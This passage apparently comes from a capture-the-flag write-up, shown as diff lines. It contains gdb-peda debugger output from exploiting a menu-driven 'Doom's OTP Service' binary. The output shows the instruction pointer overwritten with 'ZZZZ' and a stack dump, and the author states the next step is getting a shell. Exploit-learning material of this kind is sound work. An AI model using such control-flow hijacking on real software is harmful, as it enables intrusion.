+0x80f0c40:      0x00000000      0x00000000      0x00000000      0x00000000
+0x80f0c50:      0x00000000      0x00000000      0x00000000      0x00000000
+0x80f0c60:      0x00000000      0x00000000      0x00000000      0x00000000
+0x80f0c70:      0x00000000      0x00000000      0x00000000      0x00000000
+0x80f0c80:      0x00000000      0x00000000      0x00000000      0x00000000
+0x80f0c90:      0x00000000      0x00000000      0x00000000      0x00000000
+0x80f0ca0:      0x00000000      0x00000000      0x00000000      0x00000000
+0x80f0cb0:      0x00000000      0x00000000      0x00000000      0x00000000
+0x80f0cc0:      0x00000000      0x00000000      0x00000000      0x00000000
+0x80f0cd0:      0x00000000      0x00000000      0x00000000      0x00000000
+0x80f0ce0:      0x00000000      0x00000000      0x00000000      0x00000000
+gdb-peda$ c
+Continuing.
++---------------------------------------+
+|        Doom's OTP Service v1.0        |
++---------------------------------------+
+|------------ Services Menu ------------|
+|---------------------------------------|
+| 1. Create secure message              |
+| 2. Edit secure message                |
+| 3. Destroy secure message             |
+| 4. Print message details              |
+| 5. Quit                               |
++---------------------------------------+
+Enter Choice: 4
+-----------------------------------------
+-Input message index to print: 1
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+EAX: 0x5a5a5a5a ('ZZZZ')
+EBX: 0x80481a8 (<_init>:        push   ebx)
+ECX: 0xbffff6cd --> 0x4008000a
+EDX: 0x80f0ae0 ("ZZZZ\n\230\004_\177_[>\004\070-\004\350\064\037`Z\230kb\r\200\223f\347\255j~\232BsG\225\367\210-\272\355\301bj\304\303?o\273\005\033|;3\031\323\006`t\241YsG6Do%\036\232*`\204+\371v)=}!\216\361K^-\033\256\031\036Tg;\267j;\026L\332|A\002\002MG<\364\251~`t,\034${\033gYNhK\017\200\333\035E\355XkT\347l*\222\352v:\023:-_jL'\004\350\064\037`Z\230kb\r\200\223f\347\255j~\232BsG\225\367\210-\272\355\301bj\304\303?o\273\005\033|;3\031\323\006`t\241YsG6Do%\036\232*`"...)
+ESI: 0x0
+EDI: 0x80ebfbc --> 0x8069190 (<__stpcpy_sse2>:  mov    edx,DWORD PTR [esp+0x4])
+EBP: 0xbffff6f8 --> 0xbffff728 --> 0x8049e70 (<__libc_csu_fini>:        push   ebx)
+ESP: 0xbffff6ac --> 0x8049521 (<print_index+160>:       mov    eax,0x0)
+EIP: 0x5a5a5a5a ('ZZZZ')
+EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x5a5a5a5a
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff6ac --> 0x8049521 (<print_index+160>:      mov    eax,0x0)
+0004| 0xbffff6b0 --> 0x80f0ae0 ("ZZZZ\n\230\004_\177_[>\004\070-\004\350\064\037`Z\230kb\r\200\223f\347\255j~\232BsG\225\367\210-\272\355\301bj\304\303?o\273\005\033|;3\031\323\006`t\241YsG6Do%\036\232*`\204+\371v)=}!\216\361K^-\033\256\031\036Tg;\267j;\026L\332|A\002\002MG<\364\251~`t,\034${\033gYNhK\017\200\333\035E\355XkT\347l*\222\352v:\023:-_jL'\004\350\064\037`Z\230kb\r\200\223f\347\255j~\232BsG\225\367\210-\272\355\301bj\304\303?o\273\005\033|;3\031\323\006`t\241YsG6Do%\036\232*`"...)
+0008| 0xbffff6b4 --> 0x0
+0012| 0xbffff6b8 --> 0xa ('\n')
+0016| 0xbffff6bc --> 0x80ec240 --> 0xfbad2887
+0020| 0xbffff6c0 --> 0x80ec240 --> 0xfbad2887
+0024| 0xbffff6c4 --> 0x29 (')')
+0028| 0xbffff6c8 --> 0x1
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x5a5a5a5a in ?? ()
+gdb-peda$
+
+EIP: 0x5a5a5a5a ('ZZZZ') <-- OK, so far so good. 
+
+
+OK, let's see the stack:
+
+gdb-peda$ x/100 $esp
+0xbffff6ac:     0x08049521      0x080f0ae0      0x00000000      0x0000000a
+0xbffff6bc:     0x080ec240      0x080ec240      0x00000029      0x00000001
+0xbffff6cc:     0x08000a31      0x080ec240      0x0000000a      0x00000029
+0xbffff6dc:     0x08050280      0x080ec240      0x080c035e      0x00000004
+0xbffff6ec:     0x7a8d1900      0x00000000      0x080ebfbc      0xbffff728
+0xbffff6fc:     0x0804967e      0x080c0370      0x00000000      0x00000002
+0xbffff70c:     0x00000000      0x080ec014      0xbffff7b4      0x00000004
+0xbffff71c:     0x7a8d1900      0x00000000      0x080ebfbc      0x08049e70
+0xbffff72c:     0x080498ba      0x00000001      0xbffff7b4      0xbffff7bc
+0xbffff73c:     0x00000000      0x00000000      0x080481a8      0x00000000
+0xbffff74c:     0x080ebfbc      0x08049e70      0x20e56e6e      0xd63bff01
+0xbffff75c:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff76c:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff77c:     0x00000000      0x00000001      0x00000000      0x00000000
+0xbffff78c:     0x08048d4b      0x08049569      0x00000001      0xbffff7b4
+0xbffff79c:     0x08049dd0      0x08049e70      0x00000000      0xbffff7ac
+0xbffff7ac:     0x00000000      0x00000001      0xbffff8d3      0x00000000
+0xbffff7bc:     0xbffff8de      0xbffff8f0      0xbffff900      0xbffff915
+0xbffff7cc:     0xbffff936      0xbffff949      0xbffff954      0xbffffe75
+0xbffff7dc:     0xbffffe86      0xbffffe92      0xbffffef0      0xbfffff05
+0xbffff7ec:     0xbfffff14      0xbfffff1d      0xbfffff2e      0xbfffff37
+0xbffff7fc:     0xbfffff48      0xbfffff50      0xbfffff5e      0xbfffff90
+0xbffff80c:     0xbfffffb0      0xbfffffcf      0x00000000      0x00000020
+0xbffff81c:     0xb7ffdd3c      0x00000021      0xb7ffd000      0x00000010
+0xbffff82c:     0x078bfbff      0x00000006      0x00001000      0x00000011
+
+Yup, it looks the way I exected it to look when while doing the print_msg call.
+
+Now, from this point, we need to figure out how to get a shell.
+
